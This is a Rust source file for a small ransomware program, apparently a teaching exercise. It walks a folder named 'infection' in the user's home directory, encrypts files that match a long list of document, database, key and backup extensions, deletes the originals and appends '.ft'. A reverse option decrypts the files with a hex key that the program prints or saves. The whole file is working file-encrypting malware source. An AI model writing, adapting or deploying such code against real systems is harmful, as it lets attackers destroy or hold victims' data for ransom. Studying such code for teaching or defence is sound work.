use anyhow::Result;
use clap::Parser;
use simple_crypt::{decrypt_file, encrypt_file};
use std::{
    fs::File,
    io::Write,
    path::{Path, PathBuf},
};
use walkdir::WalkDir;

const FILE_EXTENSIONS: &[&str] = &[
    "docx", "ppam", "sti", "vcd", "3gp", "sch", "myd", "wb2", "docb", "potx", "sldx", "jpeg",
    "mp4", "dch", "frm", "slk", "docm", "potm", "sldm", "jpg", "mov", "dip", "odb", "dif", "dot",
    "pst", "sldm", "bmp", "avi", "pl", "dbf", "stc", "dotm", "ost", "vdi", "png", "asf", "vb",
    "db", "sxc", "dotx", "msg", "vmdk", "gif", "mpeg", "vbs", "mdb", "ots", "xls", "eml", "vmx",
    "raw", "vob", "ps1", "accdb", "ods", "xlsm", "vsd", "aes", "tif", "wmv", "cmd", "sqlitedb",
    "max", "xlsb", "vsdx", "ARC", "tiff", "fla", "js", "sqlite3", "3ds", "xlw", "txt", "PAQ",
    "nef", "swf", "asm", "asc", "uot", "xlt", "csv", "bz2", "psd", "wav", "h", "lay6", "stw",
    "xlm", "rtf", "tbk", "ai", "mp3", "pas", "lay", "sxw", "xlc", "123", "bak", "svg", "sh", "cpp",
    "mml", "ott", "xltx", "wks", "tar", "djvu", "class", "c", "sxm", "odt", "xltm", "wk1", "tgz",
    "m4u", "jar", "cs", "otg", "pem", "ppt", "pdf", "gz", "m3u", "java", "suo", "odg", "p12",
    "pptx", "dwg", "7z", "mid", "rb", "sln", "uop", "csr", "pptm", "onetoc2", "rar", "wma", "asp",
    "ldf", "std", "crt", "pot", "snt", "zip", "flv", "php", "mdf", "sxd", "key", "pps", "hwp",
    "backup", "3g2", "jsp", "ibd", "otp", "pfx", "ppsm", "602", "iso", "mkv", "brd", "myi", "odp",
    "der", "ppsx", "sxi",
];

#[derive(Parser)]
#[clap(version)]
struct Args {
    #[clap(short, long, value_name = "KEY", help = "Reverse the infection")]
    reverse: Option<String>,
    #[clap(short, long, help = "Don't print encrypted files")]
    silent: bool,
}
fn main() -> Result<()> {
    let args = Args::parse();
    let folder = dirs::home_dir().unwrap().join("infection");
    if let Some(hexkey) = args.reverse {
        let mut key: [u8; 32] = [0; 32];
        hex::decode_to_slice(hexkey, &mut key)?;
        reverse(&folder, &key, args.silent)?;
    } else {
        let key: [u8; 32] = rand::random();
        let hexkey = hex::encode(key);
        if args.silent {
            let mut file = File::create("key.txt")?;
            file.write_all(hexkey.as_bytes())?;
        } else {
            println!("shhhhhhhhhhh, key is {} ...", hex::encode(key));
        }
        infect(&folder, &key, args.silent)?;
    }
    Ok(())
}

fn reverse(folder: &PathBuf, key: &[u8], silent: bool) -> Result<()> {
    let mut counter = 0;
    for entry in WalkDir::new(folder).into_iter().filter_map(|e| e.ok()) {
        if entry.path().is_dir() {
            continue;
        }
        let path = entry.path();
        let extension = match path.extension() {
            Some(ext) => ext,
            None => continue,
        };
        if extension == "ft" {
            let newpath_buf = path.with_extension("");
            let newpath = newpath_buf.as_path();
            let res = decrypt_file(path, newpath, key);
            match res {
                Ok(_) => {
                    if !silent {
                        println!("decrypting {}", path.display());
                    }
                    counter += 1;
                    if let Err(e) = std::fs::remove_file(path) {
                        if !silent {
                            println!("failed to remove {}: {:?}", path.display(), e);
                        }
                    }
                }
                Err(e) => {
                    if !silent {
                        println!("failed to decrypt {}: {}", path.display(), e);
                    }
                }
            }
        }
    }
    if !silent {
        if counter > 0 {
            println!("decrypted {counter} files");
        } else {
            println!("no files matched the criteria to be decrypted");
        }
    }
    Ok(())
}

fn infect(folder: &PathBuf, key: &[u8], silent: bool) -> Result<()> {
    let mut counter = 0;
    for entry in WalkDir::new(folder).into_iter().filter_map(|e| e.ok()) {
        if entry.path().is_dir() {
            continue;
        }
        let path = entry.path();
        let extension = match path.extension() {
            Some(ext) => ext,
            None => continue,
        };
        if FILE_EXTENSIONS.contains(&extension.to_str().unwrap_or("invalid")) {
            let pathft = format!("{}.ft", path.display());
            let newpath = Path::new(&pathft);
            let res = encrypt_file(path, newpath, key);
            match res {
                Ok(_) => {
                    if !silent {
                        println!("encrypted {}", path.display());
                    }
                    counter += 1;
                    if let Err(e) = std::fs::remove_file(path) {
                        if !silent {
                            println!("failed to remove {}: {:?}", path.display(), e);
                        }
                    }
                }
                Err(e) => {
                    if !silent {
                        println!("failed to encrypt {}: {:?}", path.display(), e);
                    }
                }
            }
        }
    }
    if !silent {
        if counter > 0 {
            println!("encrypted {counter} files");
        } else {
            println!("no files matched the criteria to be encrypted");
        }
    }
    Ok(())
}
